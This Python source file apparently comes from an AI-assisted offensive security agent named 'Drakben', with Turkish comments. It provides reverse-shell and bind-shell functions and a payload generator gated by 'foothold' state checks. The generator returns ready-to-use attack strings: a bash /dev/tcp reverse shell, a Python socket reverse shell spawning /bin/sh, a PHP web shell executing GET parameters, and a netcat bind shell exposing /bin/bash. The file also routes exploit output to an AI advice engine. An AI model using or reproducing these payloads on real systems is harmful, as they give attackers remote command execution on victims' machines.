# modules/payload.py
# Drakben Payload Modülü - STATE-AWARE İleri Seviye
# ZORUNLU: Foothold olmadan payload YASAK

import asyncio
import socket
import subprocess
from modules import ai_bridge

# State integration
try:
    from core.state import AgentState, AttackPhase
    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False


def check_payload_preconditions(state: 'AgentState') -> tuple[bool, str]:
    """
    Payload precondition kontrolü - KESİN ZORUNLU
    
    KURAL: Foothold olmadan payload YASAK
    
    Returns:
        (can_execute, reason)
    """
    if not STATE_AVAILABLE or not state:
        return False, "State tracking is required for payload execution"
    
    # Precondition 1: FOOTHOLD OLMADAN PAYLOAD YASAK
    if not state.has_foothold:
        return False, "FORBIDDEN: Payload requires foothold first"
    
    # Precondition 2: Must be in appropriate phase
    if state.phase not in [AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]:
        return False, f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT"
    
    return True, "Preconditions satisfied"


# -------------------------
# Reverse Shell Payload
# -------------------------
async def reverse_shell(target_ip="127.0.0.1", target_port=4444, state: 'AgentState' = None):
    """STATE-AWARE Reverse shell - FOOTHOLD GEREKLİ"""
    print(f"[Payload] Reverse shell baslatiliyor: {target_ip}:{target_port}")
    
    # Enforce state required
    if state is None:
        raise RuntimeError("State is required for payload execution")

    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            return {
                "type": "ReverseShell",
                "success": False,
                "error": "State invariant violation",
                "blocked": True,
                "invariant_violations": getattr(state, "invariant_violations", [])
            }

    # PRECONDITION CHECK - ZORUNLU
    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        print(f"[Payload] ❌ BLOCKED: {reason}")
        return {
            "type": "ReverseShell",
            "success": False,
            "error": reason,
            "blocked": True,
            "critical_violation": "Attempted payload without foothold"
        }
    
    try:
        reader, writer = await asyncio.open_connection(target_ip, target_port)
        writer.write(b"Drakben reverse shell connection established.\n")
        await writer.drain()
        
        # Update state - foothold confirmed
        if STATE_AVAILABLE and state:
            state.mark_post_exploit_done("reverse_shell_established")
            if not state.validate():
                return {"type": "ReverseShell", "success": False, "error": "State invariant violation after update", "blocked": True, "invariant_violations": getattr(state, "invariant_violations", [])}

        return {"type": "ReverseShell", "success": True, "ip": target_ip, "port": target_port}
    except Exception as e:
        return {"type": "ReverseShell", "success": False, "error": str(e)}

# -------------------------
# Bind Shell Payload
# -------------------------
async def bind_shell(listen_ip="0.0.0.0", listen_port=5555, state: 'AgentState' = None):
    """STATE-AWARE Bind shell - FOOTHOLD GEREKLİ"""
    print(f"[Payload] Bind shell dinleniyor: {listen_ip}:{listen_port}")
    
    if state is None:
        raise RuntimeError("State is required for payload execution")

    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            return {"type": "BindShell", "success": False, "error": "State invariant violation", "blocked": True, "invariant_violations": getattr(state, "invariant_violations", [])}

    # PRECONDITION CHECK - ZORUNLU
    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        print(f"[Payload] ❌ BLOCKED: {reason}")
        return {
            "type": "BindShell",
            "success": False,
            "error": reason,
            "blocked": True,
            "critical_violation": "Attempted payload without foothold"
        }
    try:
        server = await asyncio.start_server(handle_client, listen_ip, listen_port)
        await server.start_serving()
        return {"type": "BindShell", "success": True, "ip": listen_ip, "port": listen_port}
    except Exception as e:
        return {"type": "BindShell", "success": False, "error": str(e)}

async def handle_client(reader, writer):
    writer.write(b"Drakben bind shell connection established.\n")
    await writer.drain()

# -------------------------
# Command Execution Payload
# -------------------------
def execute_command(cmd="id", state: 'AgentState' = None):
    if state is None:
        raise RuntimeError("State is required for payload command execution")
    # Direct command execution is forbidden; must use ToolSelector via agent tool execution path
    raise RuntimeError("Direct command execution is forbidden. Use ToolSelector via the agent executor.")

# -------------------------
# AI Destekli Payload Önerisi
# -------------------------
async def ai_payload_advice(exploit_output, state: 'AgentState' = None):
    print("[Payload] AI öneri motoru çalışıyor...")
    if state is None:
        raise RuntimeError("State is required for AI payload advice")
    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            return {"type": "AI", "error": "State invariant violation", "blocked": True, "invariant_violations": getattr(state, "invariant_violations", [])}

    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        return {"type": "AI", "error": reason, "blocked": True}
    advice = await ai_bridge.analyze_payload_output(exploit_output)
    return {"type": "AI", "advice": advice}

# -------------------------
# Generate Payload (Helper)
# -------------------------
def generate_payload(payload_type, lhost=None, lport=4444, state: 'AgentState' = None):
    """
    Generate various payload types
    
    Args:
        payload_type: Type of payload (reverse_shell, bind_shell, web_shell, etc.)
        lhost: Local host for reverse shell
        lport: Local port
    
    Returns:
        dict with payload code
    """
    if state is None:
        raise RuntimeError("State is required for payload generation")

    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            return {"error": "State invariant violation", "blocked": True, "invariant_violations": getattr(state, "invariant_violations", [])}

    can_execute, reason = check_payload_preconditions(state)
    if not can_execute:
        return {"error": reason, "blocked": True}

    payloads = {
        "reverse_shell_bash": {
            "code": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" if lhost else "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
            "platform": "Linux",
            "description": "Bash reverse shell"
        },
        "reverse_shell_python": {
            "code": f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{lhost}\',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"' if lhost else 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((LHOST,LPORT));..."',
            "platform": "Linux/Windows",
            "description": "Python reverse shell"
        },
        "web_shell_php": {
            "code": "<?php system($_GET['cmd']); ?>",
            "platform": "PHP Web Server",
            "description": "Simple PHP web shell"
        },
        "bind_shell_nc": {
            "code": f"nc -lvnp {lport} -e /bin/bash",
            "platform": "Linux",
            "description": "Netcat bind shell"
        }
    }
    
    return payloads.get(payload_type.lower(), {
        "error": f"Unknown payload type: {payload_type}",
        "available": list(payloads.keys())
    })
